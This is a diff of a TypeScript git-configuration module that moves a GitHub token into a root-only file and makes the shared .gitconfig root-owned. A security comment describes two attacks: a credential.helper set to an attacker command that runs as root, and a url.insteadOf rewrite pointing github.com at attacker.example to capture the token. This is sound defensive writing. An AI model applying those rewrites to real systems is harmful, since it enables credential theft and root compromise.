@@ -149,6 +149,59 @@ function applySafeDirectoryPolicy(): void {
 }
 
 /**
+ * Filename, beside `.gitconfig`, of the root-only file holding the GitHub PAT
+ * in git-credential-helper output format (`username=…\npassword=…`).
+ *
+ * docs/266 E3. Deliberately NOT `.git-credentials` — that is git's own
+ * `credential-store` format (a list of `https://user:pass@host` URLs), and a
+ * file with that name in a directory git might treat as `$HOME` could be picked
+ * up by a helper nobody configured. This one is only ever read by the inline
+ * `cat` helper {@link setGlobalCredentialHelper} installs.
+ */
+export const GLOBAL_CREDENTIAL_FILENAME = ".git-credential-github";
+
+/**
+ * Where {@link GLOBAL_CREDENTIAL_FILENAME} lives, derived from the same
+ * credentials directory `GIT_CONFIG_GLOBAL` points into.
+ *
+ * Derived rather than passed because {@link setGlobalCredentialHelper} is
+ * called from token-install paths that never saw the credentials dir
+ * (`GitHubAuthManager.setToken`, the boot re-install). `initGlobalGitConfig`
+ * always runs first and sets the variable; the literal is the production
+ * default and only matters if a caller inverts that order.
+ */
+function globalCredentialFilePath(): string {
+  const configPath = process.env.GIT_CONFIG_GLOBAL;
+  return path.join(configPath ? path.dirname(configPath) : "/credentials", GLOBAL_CREDENTIAL_FILENAME);
+}
+
+/**
+ * Write the PAT where only root can read it.
+ *
+ * `writeFileSync`'s `mode` applies only on creation, so the explicit `chmodSync`
+ * is what repairs a file an older build left at a looser mode — the same reason
+ * `CredentialStore.save` does it. No `chownToSessionWorker` here, ever: this
+ * file staying root-owned IS the control.
+ */
+function writeRootOnlyCredentialFile(target: string, token: string): void {
+  fs.mkdirSync(path.dirname(target), { recursive: true, mode: 0o711 });
+  fs.writeFileSync(target, `username=x-access-token\npassword=${token}\n`, { mode: 0o600 });
+  tightenMode(target, 0o600);
+}
+
+/**
+ * Quote a path for the `sh -c` the `!`-prefixed helper runs as.
+ *
+ * The path is ShipIt's own (a directory the operator configures plus a frozen
+ * filename), never repo- or user-controlled, so this is defence against an
+ * awkward mount path rather than against an attacker. A literal `'` cannot be
+ * expressed inside single quotes, so it is escaped the POSIX way.
+ */
+function singleQuote(value: string): string {
+  return `'${value.replaceAll("'", "'\\''")}'`;
+}
+
+/**
  * Set GIT_CONFIG_GLOBAL to a file in the credentials directory so all git
  * operations (in any repo) inherit identity and settings from a single place.
  *
@@ -158,10 +211,11 @@ function applySafeDirectoryPolicy(): void {
 export function initGlobalGitConfig(credentialsDir: string): void {
   // docs/266 — 0711, not the default 0755 and deliberately NOT 0700.
   //
-  // This directory holds the orchestrator's `.gitconfig`, into which
-  // `setGlobalCredentialHelper` writes the raw PAT inline. At 0755 every uid in
-  // the orchestrator container could read it — harmless while nothing non-root
-  // ran there, and load-bearing the moment orchestrator git drops uid.
+  // This directory holds the credential store, the GitHub PAT
+  // (`GLOBAL_CREDENTIAL_FILENAME`, root-only since E3) and the orchestrator's
+  // `.gitconfig`. At 0755 every uid in the orchestrator container could list it
+  // and read whatever inside was not itself 0600 — harmless while nothing
+  // non-root ran there, and load-bearing the moment orchestrator git drops uid.
   //
   // 0700 was the first attempt and it is WRONG: it also denies *traversal*, and
   // orchestrator git that has dropped to the session uid has to reach
@@ -346,20 +400,29 @@ export const FALLBACK_CONTAINER_GIT_IDENTITY: GitIdentity = {
  *     `safeSimpleGit` — `git-utils.ts` and `repo-git.ts` both do — silently
  *     discarded it while the uid drop stayed in force. That combination is
  *     worse than not trying: dropped uid, root's config.
- *   - **It bought nothing.** Its whole purpose was keeping the PAT away from
- *     the worker uid, but a dropped-uid git must `push`, so the token has to be
- *     reachable by that uid anyway. Two files, an env override and an
+ *   - **It bought nothing at the time.** Its whole purpose was keeping the PAT
+ *     away from the worker uid, but a dropped-uid git must `push`, so the token
+ *     had to be reachable by that uid anyway. Two files, an env override and an
  *     `allowUnsafeConfigPaths` opt-in, all to hide a secret that had to be
  *     visible.
  *
- * So: one config, owned by the worker uid at 0600. Root reads it because root
- * ignores permissions; the worker reads it because it owns it; no other uid in
- * the container can, which is the actual improvement over the 0644 it used to
- * have. No environment override exists to be clobbered.
+ * So: one config, no environment override to be clobbered.
  *
- * A second config becomes the right shape again only when the dropped git stops
- * needing the PAT — planning#404's repo-scoped, short-lived token. Until then
- * this is the honest arrangement, and the residual is recorded there.
+ * **docs/266 E3 (planning#404) removed the last reason to want a second file,
+ * and changed how this one is shared.** The third bullet no longer holds: the
+ * dropped git gets a repo-scoped credential of its own per remote op
+ * (`shared/git-remote-credential.ts`), so the PAT does not have to be visible
+ * to it — and it is not, because `setGlobalCredentialHelper` keeps the token in
+ * a root-only file beside this config rather than inline in it. What is left
+ * here is identity, `commit.gpgsign`, `url.insteadOf` and `safe.directory`: no
+ * secret. Splitting the *config* would still buy nothing; splitting the
+ * *secret* out of it bought everything.
+ *
+ * E1 handed this file to the **worker uid at 0600**, which it had to while the
+ * file carried the PAT. With the secret gone that ownership is strictly worse
+ * than the alternative, because owning a file is permission to *write* it —
+ * see {@link restoreRootOwnership} for the two root-side executions that buys.
+ * So it is **root-owned 0644** now: the worker reads it, and only root writes.
  */
 function reshareGlobalGitConfig(): void {
   const configPath = process.env.GIT_CONFIG_GLOBAL;
@@ -370,15 +433,53 @@ function reshareGlobalGitConfig(): void {
 function shareGlobalGitConfigWithWorker(credentialsDir: string): void {
   if (sessionWorkerUid() === null) return;
   const configPath = path.join(credentialsDir, ".gitconfig");
+  if (!fs.existsSync(configPath)) return;
+  // Readable by the worker uid, writable by nobody but root.
+  tightenMode(configPath, 0o644);
+  restoreRootOwnership(configPath);
+}
+
+/**
+ * Take a path back to `root:root`, best-effort.
+ *
+ * E1 left this file **owned by the worker uid** — it had to, because the file
+ * carried the inline PAT at 0600 and the dropped git had to read it. E3 removed
+ * the secret, and that ownership is now the sharper problem: mode 0600 plus
+ * owner uid 1000 means the untrusted side can *write* the file, in place, with
+ * no directory write needed. It does not have to steal the PAT; it can rewrite
+ * this config and wait, because **root-side** git reads it too
+ * (`GIT_CONFIG_GLOBAL` is inherited by every child, and the bare-cache fetch and
+ * the self-update have no `-c credential.helper=` reset):
+ *
+ *   - `credential.helper = !<attacker command>` runs that command **as root**,
+ *     which can then read the root-only credential file. Requirement 1's exact
+ *     worst case, through requirement 3's exact key class.
+ *   - `url.https://attacker.example/.insteadOf = https://github.com/` sends the
+ *     next root-side fetch elsewhere, where the (host-blind) global helper hands
+ *     over the PAT — docs/172 Gap 2's host confusion, re-created one level up.
+ *
+ * Neither needs the config to be *readable* by the attacker, so tightening the
+ * mode would not have helped; the writability is the whole bug. Now that the
+ * file holds no secret, the right shape is the plain one: root-owned, 0644,
+ * world-readable inside the orchestrator container and writable only by the
+ * process that maintains it. Found by the independent review of PR #2341.
+ *
+ * Called on every write path rather than once at boot, because `git config`
+ * rewrites through a lock+rename — the inode changes, so ownership has to be
+ * re-asserted after each write, exactly as the old chown-to-worker did.
+ */
+function restoreRootOwnership(target: string): void {
+  // Only root can give a file away, and only a containerized orchestrator has a
+  // worker uid to take it back from. Everywhere else this is a no-op.
+  if (process.getuid?.() !== 0) return;
   try {
-    fs.writeFileSync(configPath, fs.readFileSync(configPath), { mode: 0o600 });
-  } catch {
-    // No config yet (no identity, no token) — nothing to share, and the next
-    // write goes through `git config`, which this function re-runs after.
-    return;
+    fs.lchownSync(target, 0, 0);
+  } catch (err) {
+    console.warn(
+      `[git-config] could not restore root ownership of ${target}:`,
+      err instanceof Error ? err.message : String(err),
+    );
   }
-  tightenMode(configPath, 0o600);
-  chownToSessionWorker(configPath);
 }
 
 export function writeContainerGitConfig(destPath: string): void {
@@ -466,13 +567,59 @@ export function setGitIdentity(name: string, email: string): void {
  * is identical at the git layer.
  */
 export function setGlobalCredentialHelper(token: string): void {
-  // `!f() { echo "password=TOKEN"; echo "username=x-access-token"; }; f` —
-  // git invokes the value as a shell command when the leading char is `!`.
-  const helper = `!f() { echo "password=${token}"; echo "username=x-access-token"; }; f`;
+  // docs/266 E3 (planning#404) — the PAT is written to a ROOT-ONLY file and the
+  // config carries only the path.
+  //
+  // It used to be inline: `!f() { echo "password=<TOKEN>"; …}; f` in the config
+  // itself. E1 then had to make that config readable by the session-worker uid,
+  // because a dropped-uid git reads it for identity and for the credential it
+  // needs to push — so the PAT became readable by the one principal that can
+  // also *execute* there. Requirement 11's "equal authority is not an
+  // escalation" argument does not stretch to cover that: the PAT reaches every
+  // repository the operator's account can, which is broader than anything the
+  // session container can obtain from its own broker.
+  //
+  // Splitting the secret out of the file fixes it without splitting the file.
+  // The config stays exactly as shareable as it was (identity, `commit.gpgsign`,
+  // `url.insteadOf`, `safe.directory`) and now carries no secret at all; the
+  // token sits beside it at 0600, owned by root and never chowned. Root git is
+  // unaffected — it reads the file and the helper echoes what it read. A
+  // dropped-uid git gets EACCES, `cat` prints nothing (stderr discarded so the
+  // failure adds no noise to the stderr classifiers docs/266 E5-detect matches
+  // on), and git moves on to the next helper: the repo-scoped one that
+  // `GitManager` supplies per remote op (`shared/git-remote-credential.ts`).
+  //
+  // Measured against git 2.39.5 before choosing this shape, because two
+  // neighbouring mechanisms behave in opposite ways and only one is survivable:
+  // an unreadable `GIT_CONFIG_GLOBAL` is silently ignored, but an unreadable
+  // `include.path` is a hard `fatal: unable to access` on *every* git command.
+  // So the token could not be pulled in by an include.
+  const credentialPath = globalCredentialFilePath();
+  writeRootOnlyCredentialFile(credentialPath, token);
+  // `2>/dev/null` on the `cat`, but a LOUD line when the file is not there at
+  // all. The two failures are different and only one of them is expected:
+  //
+  //   - **Unreadable** (EACCES) is the designed state for a dropped-uid git and
+  //     happens on every session-workspace remote op, so it must stay silent —
+  //     both to keep noise out of E5-detect's stderr classifiers and because it
+  //     is not a fault.
+  //   - **Missing** is a real fault on the root path — a wiped credentials
+  //     volume, a failed first write, a `clear` that raced an install — and it
+  //     degrades into "could not read Username" with nothing anywhere saying
+  //     why. That is the silent-degradation class invariant 3 exists to
+  //     prevent, so it gets a line on stderr.
+  //
+  // `[ -e … ]` separates them exactly: it needs traverse on the directory (0711
+  // grants it to everyone) but no read on the file, so it is true for the
+  // dropped uid and false only when the file genuinely is not there.
+  // Review finding on PR #2341.
+  const quoted = singleQuote(credentialPath);
+  const helper = `!f() { [ -e ${quoted} ] || { echo "shipit: git credential file missing at ${credentialPath}" >&2; return 1; }; cat ${quoted} 2>/dev/null; }; f`;
   execFileSync("git", gitArgsWithHooksDisabled(["config", "--global", "credential.helper", helper]));
   // `git config` rewrites the file through a lock+rename, so the new inode is
-  // root-owned again. Re-share it, or the dropped-uid git loses the credential
-  // it was just given — silently, on the next push.
+  // root-owned again. Re-share it, or the dropped-uid git loses the identity
+  // and the `url.insteadOf` rewrites it was just given — silently, on the next
+  // commit.
   reshareGlobalGitConfig();
 }
 
@@ -487,6 +634,17 @@ export function clearGlobalCredentialHelper(): void {
     execFileSync("git", gitArgsWithHooksDisabled(["config", "--global", "--unset", "credential.helper"]));
   } catch {
     // Already unset — `git config --unset` exits non-zero in that case.
+  }
+  // docs/266 E3 — the token lives beside the config now, so unsetting the key
+  // is no longer the whole revocation. Remove the file too, or a revoked PAT
+  // stays on disk until the next one overwrites it.
+  try {
+    fs.rmSync(globalCredentialFilePath(), { force: true });
+  } catch (err) {
+    console.warn(
+      "[git-config] could not remove the global credential file:",
+      err instanceof Error ? err.message : String(err),
+    );
   }
   reshareGlobalGitConfig();
 }
